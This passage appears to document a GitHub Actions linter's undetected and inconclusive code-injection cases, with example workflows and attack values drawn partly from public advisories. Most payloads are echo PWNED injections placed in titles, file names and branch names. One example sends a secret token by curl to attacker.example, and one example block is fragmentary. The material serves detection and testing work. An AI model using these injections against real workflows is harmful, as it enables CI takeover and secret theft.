    ```yaml
    # attack-run-behavior: the variable NAME is set by one who may change the
    #   repository's settings; were it the value, the script would become echo
    #   "<TOKEN> "; echo PWNED; echo " <os> <outcome> <result>", and bash would
    #   run echo PWNED as a command.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ secrets.TOKEN }} ${{ vars.NAME }} ${{ runner.os }} ${{ steps.s.outcome }} ${{ needs.a.result }}"
    ```
- merged-pusher: a value that the author of a pull request writes in the profile of the account of the author (the profile name, the public email of the profile), in github.event.pull_request.merged_by of a merged pull request, or in github.event.pusher of the push that GitHub makes when GitHub merges a pull request by a rebase, by auto-merge or from a merge queue: the rule reads merged_by and the pusher as the account that merged or pushed, and the account that merged or pushed holds a credential that can merge or push; whether GitHub sets merged_by of a merged pull request, or the pusher of the push that GitHub makes when GitHub merges a pull request by a rebase, by auto-merge or from a merge queue, to the account of the author of the merged pull request was not checked
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: merged-pusher.yml (workflow, undetected)
    ```yaml
    # situation: on a pull request that is closed, a step writes the name of the
    #   account that merged the pull request into its run script.
    # reason: whether GitHub sets merged_by of a merged pull request to the
    #   account of the author of the pull request was not checked: no payload with
    #   merged_by was seen on GitHub. Were merged_by the author, the author would
    #   write the name of merged_by, which is the profile name of the account of
    #   the author.
    # cause: the table of what an attacker controls reads merged_by as the
    #   account that merged the pull request, and the account that merged the pull
    #   request holds a credential that can merge.
    # attack-value: github.event.pull_request.merged_by.name = "\"; echo PWNED; echo \""
    # attack-run-behavior: were merged_by the author of the pull request and the
    #   profile name of the account of the author this value, the script would
    #   become echo "merged by "; echo PWNED; echo "", and bash would run echo
    #   PWNED as a command.
    on:
      pull_request_target:
        types: [closed]
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "merged by ${{ github.event.pull_request.merged_by.name }}"
    ```
- compared: a context compared, negated, or given to contains, startsWith, endsWith or hashFiles: what is written out is a bool or a hash
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: compared.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a run writes the issue's title and body compared,
    #   negated, or given to contains, startsWith, endsWith or hashFiles.
    # reason: no added gain: what is written out is a bool or a hash.
    # cause: the rule reads the value of such an expression as not the
    #   attacker's text.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: each expression gives true or false, and hashFiles
    #   gives a hash or an empty string, so the value's text is not in the
    #   script, and echo prints only those words.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: >-
              echo ${{ github.event.issue.title == 'x' }} ${{ !github.event.issue.body }}
              ${{ contains(github.event.issue.title, 'x') }} ${{ startsWith(github.event.issue.title, 'x') }}
              ${{ endsWith(github.event.issue.title, 'x') }} ${{ hashFiles(github.event.issue.title) }}
    ```
- new-activity-type: an activity type GitHub added after the schemas the tables are made from, written in types: a value of types the tables do not have is dropped, as GitHub drops one it has no such activity type for
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: pin-update)
  - example: new-activity-type.yml (workflow, undetected)
    ```yaml
    # situation: on issues of an activity type added_later, a run writes the
    #   issue's title.
    # reason: a todo (a pin update): an activity type GitHub added after the
    #   pinned schemas is missed until the pins are updated.
    # cause: the analysis drops a value of types it does not know, as GitHub
    #   does for a value it has no such activity type for, so the job has no
    #   attacker's event.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: when GitHub sends issues with the activity type
    #   added_later, the script becomes echo ""; echo PWNED; echo "", and bash
    #   runs the second echo as a command, which prints PWNED.
    on:
      issues:
        types: [added_later]
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
    ```
- tojson-heredoc: toJson(...) as the whole of a \${{ }} in the body of a bash or sh heredoc that no shell or interpreter reads, whose delimiter is quoted and does not start with a space, a tab, {, }, &#91;, ] or ": the body is taken as it is, and toJson writes no line that is the delimiter (as the runner's toJson writes JSON, 2.337.0). This undetected form is only for a heredoc whose file no command runs as code; a heredoc whose file a command runs as code is the undetected form written-file
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: tojson-heredoc.yml (workflow, undetected)
    ```yaml
    # situation: on push and issues, toJson(...) is the whole of a ${{ }} in the
    #   body of a heredoc whose delimiter is quoted.
    # reason: no added gain: every line but the first and the last starts with
    #   spaces, and a string's line breaks are \n, so no line is the delimiter.
    # cause: the rule reads toJson(...) as the whole of a ${{ }} in such a body
    #   as data no shell reads.
    # attack-value: github.event.issue.body = "a\nEND\necho PWNED"
    # attack-run-behavior: toJSON(github.event.issue) and
    #   toJson(github.event.issue.body) write the body as JSON strings, with
    #   each line break as the two characters \n, so the line of the heredoc
    #   stays one line that starts with a tab, and no line is END; cat writes
    #   the JSON into issue.json, and nothing in it runs.
    on: [push, issues]
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: |
              cat > "$RUNNER_TEMP/github.json" << '__GITHUB_CONTEXT_END__'
              ${{ toJson(github) }}
              __GITHUB_CONTEXT_END__
          - run: |
              cat > "$RUNNER_TEMP/issue.json" <<-"END"
              	${{ toJSON(github.event.issue) }} ${{ toJson(github.event.issue.body) }}
              	END
    ```
- written-file: a value that a command writes as data into a file, such as echo "\$TITLE" > notes.sh or the body of a heredoc that cat writes to script.sh, where a later command or a later step runs the file as code (bash script.sh): the rule finds where bash takes a value as code inside the script of each run: step, and does not follow a value through a file
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: written-file.yml (workflow, undetected)
    ```yaml
    # situation: on issue_comment, the env of the job holds the comment's body;
    #   one step writes the body into script.sh by a heredoc that cat reads, and a
    #   later step runs script.sh with a secret.
    # reason: the body that cat writes as data becomes the code of script.sh,
    #   which bash runs in the later step with the job's secrets and token.
    # cause: the rule finds where bash takes a value as code inside the script
    #   of each run: step, and does not follow a value through a file that a
    #   later step runs.
    # attack-value: github.event.comment.body = "curl -d \"$TOKEN\" https://attacker.example/PWNED"
    # attack-run-behavior: the first step writes the comment into script.sh, and
    #   bash script.sh in the later step runs the comment as a command, which
    #   sends the secret DEPLOY to the server of the attacker.
    on: issue_comment
    jobs:
      a:
        runs-on: ubuntu-latest
        env:
          BODY: ${{ github.event.comment.body }}
        steps:
          - run: |
              cat > script.sh <<EOF
              $BODY
              EOF
          - run: bash script.sh
            env:
              TOKEN: ${{ secrets.DEPLOY }}
    ```
  - example: written-file.ghsa-9p44-j4g5-cfx5.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target, a step writes an export line of an input
    #   of the job into trivy_envs.txt, with the value in the env of the step and no
    #   escaping, and a later step sources the file. This is the second place that
    #   GHSA-9p44-j4g5-cfx5 names in aquasecurity/trivy-action v0.33.1 (commit
    #   b6643a29fecd7f34b3597bc6acb0a98b03d33ff8): the function
    #   set_env_var_if_provided of action.yaml (lines 181-190) writes "export
    #   $var_name=$input_value", and entrypoint.sh line 9 sources ./trivy_envs.txt.
    #   Here the input is in the env, as after the fix that the rule code-injection
    #   gives to the ${{ }} of the input (line 201), and the example is a workflow
    #   in place of the composite action, with the title of the pull request in
    #   place of the input named output.
    # reason: the value that echo writes as data becomes the code of
    #   trivy_envs.txt, which source runs in the later step: an export line with
    #   a$(…) or a;… in the value runs the command.
    # cause: the rule finds where bash takes a value as code inside the script of
    #   each run: step, and does not follow a value through a file that a later step
    #   runs.
    # attack-value: github.event.pull_request.title = "x; echo PWNED"
    # attack-run-behavior: the first step writes export TRIVY_OUTPUT=x; echo PWNED
    #   into trivy_envs.txt, and source ./trivy_envs.txt in the later step runs echo
    #   PWNED as a command, which prints PWNED.
    # advisory: https://github.com/advisories/GHSA-9p44-j4g5-cfx5
    on: pull_request_target
    jobs:
      scan:
        runs-on: ubuntu-latest
        steps:
          - env:
              INPUTS_OUTPUT: ${{ github.event.pull_request.title }}
            run: |
              echo "export TRIVY_OUTPUT=$INPUTS_OUTPUT" >> trivy_envs.txt
          - run: source ./trivy_envs.txt
    ```
- insider-association: an if that lets in MEMBER or COLLABORATOR by the author_association of the issue, the pull request or the discussion the run is of, which the following pass: a member or a collaborator whose repository role is Read only, who gets, in the run, a token that writes and the secrets, more than what the Read role gives; the account of such a member or collaborator, taken over; and an outsider who becomes a MEMBER with the Read role, in an organization that lets anyone become a member (a bot that invites whoever asks). A member or a collaborator whose role is Triage or above holds a credential that can add a label or write to the repository, which the credential premise assumes no attacker holds. Who is a member, and with what role, is not in the workflow
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - added attackers: read-member, triage-account, writer-issues-token, required-reviewer
  - example: insider-association.yml (workflow, undetected)
    ```yaml
    # situation: on issues opened, a job whose if lets in an issue whose
    #   author_association is MEMBER writes the issue's title in a run.
    # reason: a todo (a fact): a member of the organization, who may have read
    #   access only, passes this if (in an organization that lets anyone become a
    #   member, such as by a bot that invites whoever asks, an outsider becomes such
    #   a member), and gets the job's token and secrets past what the Read role
    #   gives; who is a member, and with what role, is not in the workflow.
    # cause: the rule evaluates the if with the attacker's author_association
    #   (NONE, FIRST_TIMER, FIRST_TIME_CONTRIBUTOR or CONTRIBUTOR), for which it
    #   is false, so no attacker's event runs the job.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the job's if is false for an issue whose
    #   author_association is not MEMBER, and the runner skips the job; for an
    #   issue a member opens, the script becomes echo ""; echo PWNED; echo "",
    #   and bash runs the second echo as a command, which prints PWNED.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        if: github.event.issue.author_association == 'MEMBER'
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
    ```
- remote-composite-steps: a \${{ }} whose value an attacker shapes, such as \${{ github.event.issue.title }}, in a run, in a step inside the action.yml of a composite action of another repository that a uses names (owner/repo@ref or owner/repo/path@ref; a step of that composite action, not the uses that names the composite action): the rule does not read the steps of a composite action of another repository, even when the fact action.definition gives the action.yml. A \${{ }} of an input (\${{ inputs.&lt;name> }}), whose value the step that uses the composite action gives, is declared as the undetected form action-input-remote (a composite action that a uses names) or action-input-local (a composite action that a path that starts with ./ names)
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: remote-composite-steps.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step uses the composite action
    #   example-org/title-composite at a full commit SHA, and a step of that
    #   composite action runs echo "${{ github.event.issue.title }}". The fact
    #   action.definition gives the action.yml of the composite action.
    # reason: a todo (a fact): the answer of action.definition gives the steps
    #   of the composite action, and the rule could read the run of the step.
    # cause: the rule does not read the steps of a composite action of another
    #   repository.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the script of the step of the composite action
    #   becomes echo ""; echo PWNED; echo "", and bash runs the second echo as
    #   a command, which prints PWNED.
    on: issues
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/title-composite@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```
- checked-out-local: a \${{ }} whose value an attacker shapes, such as \${{ github.event.issue.title }}, in a run, in a step inside the action.yml of a composite action that a uses names by a path that starts with ./, when an earlier step of the job checks out another repository into the workspace (actions/checkout with repository: of another repository) at a full commit SHA: the action.yml is a file of the repository that the step checks out, and the linter reads only the files of the repository of the workflow. A ./ uses in a step of a reusable workflow of another repository also names the workspace of the job: by default, actions/checkout in the reusable workflow checks out the repository of the calling workflow, not the repository of the reusable workflow, so the ./ uses names an action.yml of the repository of the calling workflow, which the linter reads when the files of the repository of the calling workflow are given to the linter. The commit decides the action.yml, and the linter does not ask action.definition for the action
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: checked-out-local.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step checks out example-org/tools at a full commit SHA
    #   into the workspace, and the next step uses ./helper, a composite action
    #   of that tree whose step runs echo "${{ github.event.issue.title }}".
    # reason: a todo (a fact): the commit decides the action.yml of ./helper, and an answer of action.definition for example-org/tools at the commit would let the rule read the run of its step.
    # cause: the action.yml of ./helper is a file of example-org/tools, not a
    #   file of the repository of the workflow that the linter reads.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the script of the step of ./helper becomes
    #   echo ""; echo PWNED; echo "", and bash runs the second echo as a
    #   command, which prints PWNED.
    on: issues
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
            with:
              repository: example-org/tools
              ref: 0123456789abcdef0123456789abcdef01234567
              persist-credentials: false
          - uses: ./helper
    ```
- checked-out-local-moving: a \${{ }} whose value an attacker shapes, such as \${{ github.event.issue.title }}, in a run, in a step inside the action.yml of a composite action that a uses names by a path that starts with ./, when an earlier step of the job checks out another repository into the workspace (actions/checkout with repository: of another repository) at a branch, at a tag, at the default branch (no ref:) or at a ref given by a \${{ }}: the action.yml is a file of the repository that the step checks out, and the linter reads only the files of the repository of the workflow. A ./ uses in a step of a reusable workflow of another repository also names the workspace of the job: by default, actions/checkout in the reusable workflow checks out the repository of the calling workflow, not the repository of the reusable workflow, so the ./ uses names an action.yml of the repository of the calling workflow, which the linter reads when the files of the repository of the calling workflow are given to the linter. The commit that the checkout reads, and so the action.yml, is decided when the job runs
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: limitation (decided by: run-time)
  - example: checked-out-local-moving.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step checks out example-org/tools at the branch main
    #   into the workspace, and the next step uses ./helper, a composite action
    #   of that tree whose step runs echo "${{ github.event.issue.title }}".
    # reason: a limitation (decided when the job runs): the commit that main points to when the job runs decides the action.yml of ./helper.
    # cause: the action.yml of ./helper is a file of example-org/tools, not a
    #   file of the repository of the workflow that the linter reads.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the script of the step of ./helper becomes
    #   echo ""; echo PWNED; echo "", and bash runs the second echo as a
    #   command, which prints PWNED.
    on: issues
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
            with:
              repository: example-org/tools
              ref: main
              persist-credentials: false
          - uses: ./helper
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/code-injection-unanswered, whose content is
    #   the workflow of the true positive controlled (controlled.parallel.yml)
    #   of the rule, with on: workflow_call in place of the on of
    #   controlled.parallel.yml. The linter has no answer of the fact
    #   workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the script becomes echo ""; echo PWNED; echo "", and
    #   the shell runs the second echo as a command, which prints PWNED.
    on:
      issues:
        types: [opened]
    permissions: {}
    jobs:
      c:
        uses: example-org/code-injection-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### inconclusive

- step-output-run: the output of a step that runs a script (steps.&lt;id>.outputs), which the script writes to \$GITHUB_OUTPUT
  - disposition: todo (needs: same-file)
  - example: step-output-run.yml (workflow, inconclusive)
    ```yaml
    # situation: the step s runs a script that writes the output o to
    #   $GITHUB_OUTPUT, and the next step writes steps.s.outputs.o into its run
    #   script by ${{ }}.
    # reason: the output is what the script writes at run time, so whether an
    #   attacker controls it is not known.
    # cause: the rule does not yet follow what a script writes to
    #   $GITHUB_OUTPUT.
    # attack-value: steps.s.outputs.o = "\"; echo PWNED; echo \""
    # attack-run-behavior: when the script of the step s writes o with the value
    #   to $GITHUB_OUTPUT, the script of the next step becomes echo ""; echo
    #   PWNED; echo "", and bash runs the second echo as a command, which prints
    #   PWNED.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - id: s
            run: echo "o=x" >> "$GITHUB_OUTPUT"
          - run: echo "${{ steps.s.outputs.o }}"
    ```
  - example: step-output-run.ghsl-2024-281.yml (workflow, inconclusive)
    ```yaml
    # situation: on workflow_run, dawidd6/action-download-artifact takes the
    #   artifact pr of the run whose completion starts the workflow, a step writes
    #   the content of its file pr-id.txt to the output id, and a later step writes
    #   the output into its run script by ${{ }}. This is preview-deploy.yml of
    #   ant-design/ant-design-web3 (commit cbbf0cefce42cabb9ef0348db507ddd3ce00dcf4,
    #   lines 3-6 and 14-52), and of ant-design/ant-design-blazor (GHSL-2024-276,
    #   commit d3668d9cecc65f2ee0dac920aa55e8f393c6773d, the same steps). The steps
    #   that build the site, the secret SURGE_TOKEN in the script, and the job for a
    #   failed build are left out, and npx surge is replaced by echo.
    # reason: the output id is what the step writes from the file of the artifact;
    #   the rule does not read the value that the step writes, so whether an
    #   attacker controls the output is not known. The pull request that runs the
    #   workflow Preview Build writes pr-id.txt of the artifact.
    # cause: the rule does not follow a value of a file through the shell into an
    #   output.
    # attack-value: steps.pr.outputs.id = "1;echo PWNED;#"
    # attack-run-behavior: the author of a pull request changes the workflow
    #   Preview Build in the pull request so that pr-id.txt holds the value; the
    #   step save PR id writes id=1;echo PWNED;# to GITHUB_OUTPUT, and the script of
    #   the step upload surge service becomes export
    #   DEPLOY_DOMAIN=https://preview-1;echo PWNED;#-ant-design-web3.surge.sh, where
    #   bash runs echo PWNED as a command, which prints PWNED, with the token of the
    #   job.
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-281_Ant-design-web3/
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-276_Ant-design-blazor/
    on:
      workflow_run:
        workflows: ["Preview Build"]
        types: [completed]
    jobs:
      upstream-workflow-summary:
        runs-on: ubuntu-latest
        steps:
          - name: download pr artifact
            uses: dawidd6/action-download-artifact@v2
            with:
              workflow: ${{ github.event.workflow_run.workflow_id }}
              run_id: ${{ github.event.workflow_run.id }}
              name: pr
          - name: save PR id
            id: pr
            run: echo "id=$(<pr-id.txt)" >> $GITHUB_OUTPUT
          - name: upload surge service
            run: |
              export DEPLOY_DOMAIN=https://preview-${{ steps.pr.outputs.id }}-ant-design-web3.surge.sh
              echo "$DEPLOY_DOMAIN"
    ```
  - example: .github/workflows/called.yml (workflow, inconclusive)
    ```yaml
    # situation: on workflow_run, caller.yml calls the reusable workflow
    #   called.yml, whose step git-commit writes the output file-list, and a step
    #   of actions/github-script puts steps.git-commit.outputs.file-list into a
    #   template literal of its script. This is publishVersionCheckResults.yml of
    #   eclipse-platform/eclipse.platform.releng.aggregator (commit
    #   6c8faac36906dc284fa73d0c2616ab843cc5efa2, lines 88-110), where the step
    #   git-commit writes the names of the files of the pull request; the git push of
    #   GHSL-2024-320 in the step git-commit is in the example
    #   controlled.ghsl-2024-320 of the true positives.
    # reason: whether the output file-list holds a value of the attacker is
    #   decided by what the script of the step git-commit writes, which the rule
    #   does not read.
    # attack-value: the name of a file that the pull request adds = "${console.log('PWNED')}"
    # attack-run-behavior: the step git-commit writes the name to the output
    #   file-list, the template literal of the script evaluates
    #   ${console.log('PWNED')}, and actions/github-script prints PWNED.
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-320_GHSL-2024-321_Eclipse/
    on:
      workflow_call:
        secrets:
          githubBotPAT: {required: true}
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - id: git-commit
            run: |
              echo "file-list<<EOF" >> $GITHUB_OUTPUT
          - uses: actions/github-script@v7
            with:
              script: "const fileList = `${{ steps.git-commit.outputs.file-list }}`"
    ```
    - .github/workflows/caller.yml (workflow)
      ```yaml
      on:
        workflow_run:
          workflows: ['Pull-Request Checks']
          types: [completed]
      jobs:
        p:
          uses: ./.github/workflows/called.yml
          secrets:
            githubBotPAT: ${{ secrets.JDT_BOT_PAT }}
      ```
  - example: step-output-run.ghsl-2024-327.yml (workflow, inconclusive)
    ```yaml
    # situation: on workflow_run of a run from a pull request, a job downloads the
    #   artifact pr-number of the triggering run, a step writes the content of
    #   pr.txt to its output id, a later step writes that output into its run by
    #   ${{ }}, and a step after it logs in to Azure with the secrets of the
    #   repository. This is pr-website-deploy-comment.yml of microsoft/fluentui
    #   (commit 18f41fc58e2a5280d9e5291063f6be7cc4d9c0eb, lines 1-6, 17-57); the
    #   concurrency, the env, the outputs of the job, the download of the website
    #   and the steps after the login are left out. adev-preview-deploy.yml of
    #   angular/angular-ja (commit 8d2ac08bfae9f68b909bf7a57fb47977bc9450a3,
    #   GHSL-2024-338) has the same form: it reads the number of the pull request
    #   from __metadata__pull_number.txt of the artifact into the output value and
    #   echoes the output in a run (line 50), and comment-on-pr.yml of sympy/sympy
    #   (commit a1c630f8041c40a833e2a52e4aa533f6e6ff8b20, GHSL-2024-322) reads
    #   pr_number.txt of the artifact into the output pr_number and echoes it in a
    #   run (line 39).
    #   preview-deploy.yml of ant-design/ant-design (commit
    #   41fba82b39ff8664c63c173f1265f56891338fd5, GHSL-2024-121_GHSL-2024-122)
    #   saves the number of the pull request from a file of the artifact to the
    #   output id and writes it into a run (line 88).
    # reason: the output is what the step reads from pr.txt, a file of the
    #   artifact that the run of the pull request uploads, so the author of the
    #   pull request writes it; the rule does not follow the output of a step back
    #   to the file that the step reads.
    # cause: the rule does not read what a run step writes to $GITHUB_OUTPUT from
    #   a file.
    # attack-value: steps.pr_number.outputs.id = "1$(echo${IFS}PWNED>/proc/$$/fd/1)"
    # attack-run-behavior: the author of a pull request from a fork makes the run
    #   of the pull request upload pr.txt with the value. The script of the step
    #   Load WEBSITE URL becomes echo "id=…pull/1$(echo PWNED>/proc/$$/fd/1)/", and bash runs
    #   the command substitution, which prints PWNED, with the token of the job;
    #   the Azure login comes in the next step.
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-327_Microsoft_FluentUI/
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-338_Angular_JA/
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-322_Sympy/
    # advisory: https://securitylab.github.com/advisories/GHSL-2024-121_GHSL-2024-122_ant-design/
    on:
      workflow_run:
        workflows: ['PR Website Deploy']
        types:
          - completed
    jobs:
      deploy:
        runs-on: ubuntu-latest
        if: ${{ github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success' }}
        permissions:
          id-token: write
        steps:
          - uses: actions/download-artifact@v4
            with:
              name: pr-number
              path: ./results
              run-id: ${{ github.event.workflow_run.id }}
              github-token: ${{ secrets.GITHUB_TOKEN }}
          - name: Load PR number
            id: pr_number
            run: echo "id=$(cat pr.txt)" >> $GITHUB_OUTPUT
            working-directory: ./results
          - name: Load WEBSITE URL
            id: website_url
            run: echo "id=https://fluentuipr.z22.web.core.windows.net/pull/${{steps.pr_number.outputs.id}}/" >> $GITHUB_OUTPUT
          - name: Login via Azure CLI
            uses: azure/login@v2
            with:
              client-id: ${{ secrets.AZURE_CLIENT_ID }}
              tenant-id: ${{ secrets.AZURE_TENANT_ID }}
              subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
    ```
  - example: step-output-run.ghsl-2026-207.yml (workflow, inconclusive)
    ```yaml
    # situation: on workflow_run, the step get_pr_data asks the API for a pull
    #   request, the step pr_meta writes the name of the head branch of the pull
    #   request (.head.ref of the answer, read with jq) to $GITHUB_OUTPUT, and a
    #   later step puts steps.pr_meta.outputs.head_ref into its script. These are
    #   the steps of sonarcloud.yml of kptdev/kpt (commit
    #   6dfff203a6b49396add815a428c1d94370e9a3d6, lines 69-97); the number of the
    #   pull request, which the original reads from an artifact, is 1 in this
    #   example. The example adds the last step, from lines 144-156 of the file,
    #   which prints github.event.workflow_run.event, the name of the event of the
    #   run that triggered the workflow, a value that an attacker does not decide.
    #   vendor-gems.yml of Homebrew/brew (commit
    #   fd69a7407574c63e3de8faf782b1b8d494ef827d, GHSL-2021-044) has the same
    #   form: a run checks out the pull request with gh pr checkout, writes a part
    #   of the name of the current branch to the output gem_name, and a later
    #   step writes the output into its script (line 45).
    # reason: whether the output head_ref holds a value of the attacker is decided
    #   by what the script of the step pr_meta writes, which the rule does not
    #   read.
    # attack-value: the name of the head branch of the pull request of a fork = "x\";echo${IFS}PWNED;#"
    # attack-run-behavior: jq writes the name to the output head_ref, the runner
    #   puts the name into the script of the step "Debug - Show PR metadata", and
    #   the line echo "Head Ref: x";echo${IFS}PWNED;#" prints PWNED.
    # advisory: https://securitylab.github.com/advisories/GHSL-2026-207_kptdev_kpt_repository/
    # advisory: https://securitylab.github.com/advisories/GHSL-2021-044-homebrew-brew-workflows/
    on:
      workflow_run:
        workflows: [Go]
        types: [completed]
    jobs:
      sonarqube:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          pull-requests: read
        steps:
          - name: Request GitHub API for PR data
            uses: octokit/request-action@b91aabaa861c777dcdb14e2387e30eddf04619ae # v3.0.0
            id: get_pr_data
            with:
              route: GET /repos/{full_name}/pulls/{number}
              number: 1
              full_name: ${{ github.event.repository.full_name }}
            env:
              GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          - name: Extract PR metadata
            id: pr_meta
            env:
              PR_DATA: ${{ steps.get_pr_data.outputs.data }}
            run: |
              echo "head_ref=$(echo "$PR_DATA" | jq -r '.head.ref')" >> "$GITHUB_OUTPUT"
          - name: Debug - Show PR metadata
            run: |
              echo "Head Ref: ${{ steps.pr_meta.outputs.head_ref }}"
          - name: Debug - Check condition variables before SonarQube scan
            run: |
              echo "Event type: ${{ github.event.workflow_run.event }}"
    ```

    ```yaml
    # situation: the step s uses some/action@v1, an action of another
    #   repository, and the next step writes steps.s.outputs.o into its run

    # reason: the output is what that action sets, and its action.yml is not in

    #   bash runs the second echo as a command, which prints PWNED.

    jobs:
      j:
        runs-on: ubuntu-latest
    ```

    ```yaml
    # situation: on pull_request_target, two jobs write an output of an action of
    #   another repository that lists the changed files into a run script by
    #   ${{ }}, in the forms of two advisories. The job changed is the proof of
    #   concept of GHSA-mcph-m25j-8j63: tj-actions/changed-files v40.2.3 (before
    #   41) gives the changed files in its output all_changed_files, and a step
    #   loops over the output (for file in ${{ … }}; do echo "$file was changed";
    #   done). The job verify is the proof of concept of GHSA-ghm2-rq8q-wrhc:
    #   tj-actions/verify-changed-files v16.1.1 (before 17) gives the changed files
    #   in its output changed_files, and a step echoes the output.
    # reason: the outputs are what the two actions set, and the action.yml of each
    #   action is not among the files that the linter reads, so whether an attacker
    #   controls an output is not known. Before the fixed versions, the two actions
    #   escape only " in the names of the files (GHSA-mcph-m25j-8j63: "only escapes
    #   \" for JSON values"), and the author of the pull request names the files
    #   of the pull request.
    # cause: the rule does not yet ask for the action.yml of another repository as
    #   a fact, and does not read what an action does with the names of files.
    # attack-value: steps.changed-files.outputs.all_changed_files = "$(echo${IFS}PWNED>/proc/$$/fd/1).txt"
    # attack-run-behavior: the author of a pull request from a fork adds a file
    #   named $(echo${IFS}PWNED>/proc/$$/fd/1).txt. The script of the step List
    #   all changed files becomes for file in $(echo${IFS}PWNED>/proc/$$/fd/1).txt;
    #   …, and bash runs the command substitution, which prints PWNED, with the
    #   token of the job. In the job verify, the name goes into the script of the
    #   echo the same way.
    # advisory: https://github.com/advisories/GHSA-mcph-m25j-8j63
    # advisory: https://github.com/advisories/GHSA-ghm2-rq8q-wrhc
    on: pull_request_target
    jobs:
      changed:
        runs-on: ubuntu-latest
        steps:
          - id: changed-files
            uses: tj-actions/changed-files@56284d80811fb5963a972b438f2870f175e5b7c8 # v40.2.3
          - name: List all changed files
            run: |
              for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
                echo "$file was changed"
              done
      verify:
        runs-on: ubuntu-latest
        steps:
          - id: verify-changed-files
            uses: tj-actions/verify-changed-files@54e20d3c522fbeed99ebaf2e38a1eb33214c58ba # v16.1.1
          - run: |
              echo "Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}"
    ```
  - example: step-output-remote-action.ghsl-2024-312.yml (workflow, inconclusive)
    ```yaml
    # situation: on workflow_dispatch, a step uses octokit/request-action to get
    #   the open issues of the repository from the API, and the next step writes
    #   the output data into its run by ${{ }} inside single quotes. This is
    #   cleanUpOpenedIssues.yml of Azure/api-management-developer-portal (commit
    #   078b6040cfd5cf254e7f83f91212a85300afbfc0, lines 1-20); the steps after it
    #   are left out.
    # reason: the output is what octokit/request-action sets, the response of the
